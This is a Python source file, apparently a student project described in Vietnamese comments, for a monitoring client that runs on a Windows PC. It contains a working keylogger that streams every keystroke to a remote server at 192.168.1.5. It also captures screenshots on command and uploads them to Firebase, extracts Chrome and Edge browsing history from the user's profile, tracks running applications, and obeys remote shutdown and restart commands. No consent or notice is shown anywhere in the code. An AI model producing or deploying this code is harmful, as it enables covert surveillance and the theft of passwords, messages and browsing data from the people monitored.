import sqlite3
import threading
from pynput.keyboard import Listener
import socket
import pyautogui
from datetime import datetime, timedelta
import time
import os
import psutil
import firebase_admin
from firebase_admin import credentials, storage, db

cred = credentials.Certificate("credentials.json")
firebase_admin.initialize_app(cred, {
    "storageBucket": "pbl4-09092003.appspot.com",
    "databaseURL": "https://pbl4-09092003-default-rtdb.firebaseio.com"
    })
ref = db.reference('history')


clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverParent = '192.168.1.5'
serverPort = 8080


try:
    clientSocket.connect((serverParent, serverPort))
except Exception as e:
    print("Error connecting to server:", str(e))
if clientSocket:
    print("connecting to server")

def convert_time(timestamp):
    epoch_start = datetime(1601, 1, 1)
    dt_object = epoch_start + timedelta(microseconds=timestamp)
    return dt_object.strftime("%Y-%m-%d %H:%M:%S")


def on_press(key):
    try:
        key = str(key)
        key = key.replace("'", "")
        if key == "Key.f12":
            raise SystemExit(0)
        clientSocket.sendall(key.encode('utf-8'))
    except Exception as e:
        print("Error: " + str(e))

def takeScreenshot():
    now = datetime.now()
    nameScreen = "screenshot-" + now.strftime("%Y%m%d-%H%M%S") + ".png"
    print("Name Screen: ", nameScreen)
    try:
        screenshot = pyautogui.screenshot()
        if screenshot:
            print("successfully taken screenshot")
        else:
            print("Failed to take screenshot")
        screenshot.save(nameScreen)
        
        # Lưu ảnh vào Firebase Storage
        bucket = storage.bucket()
        
        destination = 'images/' + nameScreen
        blob = bucket.blob(destination)
        blob.upload_from_filename(nameScreen)
        
        # Gửi link ảnh public  đến server
        # link = blob.public_url
        link = blob.generate_signed_url(expiration= int(time.time()) + 3600) 
        print("Link: ",  link)
        clientSocket.send(link.encode('utf-8'))
        
    except Exception as e:
        print("Error: " + str(e))

def getAppHistory():
    # Danh sách lưu trữ các ứng dụng hiện tại và thời điểm mở
    current_apps = {}
    start_time_dict = {}  # Lưu trữ thời gian mở ứng dụng ban đầu

    # Lặp vô hạn
    while True:
        # Lấy danh sách các ứng dụng đang chạy
        running_apps = {process.name(): int(time.time()) for process in psutil.process_iter() if process.name().endswith('.exe')}

        # Tìm các ứng dụng mới xuất hiện và tính toán thời gian mở
        new_apps = {app: timestamp for app, timestamp in running_apps.items() if app not in current_apps}

        # Tìm các ứng dụng bị đóng lại và tính toán thời gian sử dụng
        for app in current_apps:
            if app not in running_apps:
                close_time = int(time.time())
                start_time = start_time_dict.get(app, close_time)

                start_time_datetime = datetime.fromtimestamp(start_time)
                close_time_datetime = datetime.fromtimestamp(close_time)


                usage_time = close_time - start_time
                print(f"Closed App: {app}, Usage Time: {usage_time} seconds")

                # Cập nhật thời gian mở, đóng và thời gian sử dụng vào Firebase
                current_date = time.strftime('%Y-%m-%d')
                date_ref = ref.child(current_date)
                app_ref = date_ref.child('app_history').push()

                app_ref.update({
                    'app_name': app,
                    'start-time': start_time_datetime.strftime("%Y-%m-%d %H:%M:%S"),
                    'end-time': close_time_datetime.strftime("%Y-%m-%d %H:%M:%S"),
                    'usage-time': usage_time
                })

        # Cập nhật danh sách các ứng dụng hiện tại và thời điểm mở
        current_apps = {app: timestamp for app, timestamp in running_apps.items()}
        start_time_dict.update(new_apps)  # Cập nhật thời gian mở cho các ứng dụng mới xuất hiện

        # Đẩy dữ liệu vào Firebase với ngày hiện tại
        current_date = time.strftime('%Y-%m-%d')
        date_ref = ref.child(current_date)

        # Ghi dữ liệu vào Firebase
        for app, timestamp in new_apps.items():
            app_ref = date_ref.child('app_history').push()
            timestamp_datetime = datetime.fromtimestamp(timestamp)
            formatted_timestamp = timestamp_datetime.strftime("%Y-%m-%d %H:%M:%S")

            app_ref.update({
                'app_name': app, 
                'start-time': formatted_timestamp
            })

        # Chờ 1 giây trước khi lặp lại để tránh tải nhiều tài nguyên hệ thống
        time.sleep(1)
        
        
def push_to_firebase(history_data, browser_type):
    # Lấy ngày hiện tại
    current_date = datetime.now().strftime("%Y-%m-%d")
    
    # Tham chiếu đến thư mục theo ngày trong Firebase
    date_ref = ref.child(current_date)

    # Tham chiếu đến thư mục của trình duyệt
    browser_ref = date_ref.child(f"{browser_type}History")
    
    # Đẩy dữ liệu lịch sử duyệt web lên Firebase
    browser_ref.set(history_data)


def get_Edge_history():        
    db_path = os.path.expanduser('~') + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"

    connection = sqlite3.connect(db_path)
    cursor = connection.cursor()

    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
    results = cursor.fetchall()

    browsing_history = []
    for row in results:
        url, title, last_visit_time = row
        formatted_time = convert_time(last_visit_time)
        browsing_history.append({"Time": formatted_time, "title": title, "url": url})
        print(f"{formatted_time}: {title} - {url}")


    cursor.close()
    connection.close()

    # Đẩy dữ liệu lịch sử duyệt web Edge lên Firebase
    push_to_firebase(browsing_history, "Edge")

def get_Chrome_history():        
    db_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"

    connection = sqlite3.connect(db_path)
    cursor = connection.cursor()

    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
    results = cursor.fetchall()

    browsing_history = []
    for row in results:
        url, title, last_visit_time = row
        formatted_time = convert_time(last_visit_time)
        browsing_history.append({"Time": formatted_time, "title": title, "url": url})
        print(f"{formatted_time}: {title} - {url}")


    cursor.close()
    connection.close()

    # Đẩy dữ liệu lịch sử duyệt web Chrome lên Firebase
    push_to_firebase(browsing_history, "Chrome")
def getTimeShutdown():
    # Kết nối đến cơ sở dữ liệu
    conn = sqlite3.connect('PBL.db')
    cursor = conn.cursor()

    # Lấy giá trị cuối cùng từ bảng timeShutDown
    select_last_value_query = '''
    SELECT shutdownTime FROM timeShutDown ORDER BY ROWID DESC LIMIT 1;
    '''

    # Thực thi lệnh SQL
    cursor.execute(select_last_value_query)

    # Lấy kết quả
    last_value = cursor.fetchone()
    return last_value
def addTimeShutdown(timeShutDown):
        
    # Kết nối đến cơ sở dữ liệu và tạo bảng
    conn = sqlite3.connect('PBL.db')
    cursor = conn.cursor()

    # Chèn dữ liệu vào bảng user
    insert_data_query = '''
    INSERT INTO timeShutDown (shutdownTime) VALUES (?);
    '''
    # Thực thi lệnh SQL với dữ liệu cụ thể
    cursor.execute(insert_data_query, (timeShutDown,))  

    # Lưu thay đổi (commit) vào cơ sở dữ liệu
    conn.commit()

    # Đóng kết nối
    conn.close()
def shutdownByTime():
    while True:
        timeShutDown_tuple = getTimeShutdown()
        if timeShutDown_tuple:
            timeShutDown = timeShutDown_tuple[0]  # Extract the string value from the tuple
            current_time = datetime.now().strftime('%H:%M')
            shutdown_time = datetime.strptime(timeShutDown, '%H:%M')

            if current_time == shutdown_time.strftime('%H:%M'):
                print("Đã đến giờ tắt máy như đã hẹn")
                os.system("shutdown /s /t 1")
            else:
                print("current_time: ", current_time)
                print("shutdown_time:", shutdown_time.strftime('%H:%M'))
            time.sleep(30)
        else:
            print("Không có giờ tắt máy nào được đặt")
            time.sleep(30)
def get_link_from_database():
    db_ref = db.reference('web_blocks')
    data = db_ref.get()
    return data

def save_links_to_file(links, file_path):
    with open(file_path, 'a') as file:
        for entry_key, entry_value in links.items():
            link = entry_value.get('link', '')
            link_without_https = link.replace('https://', '')
            file.write(f"127.0.0.1 {link_without_https}\n")

def totalTime():

    try:
        # Lấy thời gian hiện tại
        now = datetime.now()
        current_date = now.strftime("%Y-%m-%d")
        current_hour = now.hour

        # Tạo hoặc cập nhật nút ngày trong Firebase
        date_ref = ref.child(current_date)

        # Tạo hoặc cập nhật nút giờ trong Firebase
        hour_ref = date_ref.child(str(current_hour))

        # Đọc giá trị hiện tại từ Firebase
        current_minutes = hour_ref.child("total_minutes").get() or 0

        # Cộng thêm 1 vào giá trị hiện tại
        current_minutes += 1

        # Cập nhật giá trị mới lên Firebase
        hour_ref.update({"total_minutes": current_minutes})

        # Lặp lại hàm sau mỗi phút
        threading.Timer(60, totalTime).start()

    except Exception as e:
        print(f"Error: {e}")            
with Listener(on_press=on_press) as parent:
    try:
        
        timeShutDown_thread = threading.Thread(target=shutdownByTime)
        timeShutDown_thread.start()
         
        appHistory_thread = threading.Thread(target=getAppHistory)
        appHistory_thread.start()
        
        totalTime()
        while True:
            message = clientSocket.recv(1024).decode('utf-8')
            print("Message:" + message)
            if message == 'takeScreenshot':
                takeScreenshot()
            elif message == 'ChromeHistory':
                get_Chrome_history()
            elif message == 'EdgeHistory':
                get_Edge_history()
            elif message == 'shutdown':
                os.system("shutdown /s /t 1")
            elif message == 'restart':
                os.system("shutdown /r /t 1")
            elif message == 'shutdown_time':
                shutdown_time = clientSocket.recv(1024).decode('utf-8')
                print("Shutdown time: " + shutdown_time) 
                addTimeShutdown(shutdown_time)
            elif message == 'webBlock':
                block_link = clientSocket.recv(1024).decode('utf-8')
                print("Block link: " + block_link)
                # links_data = get_link_from_database()
                # save_links_to_file(links_data, 'C:/Windows/System32/drivers/etc/host')
                # save_links_to_file(links_data, 'D:/Semeter 5/PBL4/PBL/test.txt')
                link_without_https = block_link.replace('https://', '')
                file_path = 'D:/test.txt'
                with open(file_path, 'a') as file:
                    file.write(f"127.0.0.1 {link_without_https}\n")
                
                

                 
                
    except Exception as e:
        print("Error: " + str(e))
    finally:
        parent.stop()
        parent.join()
        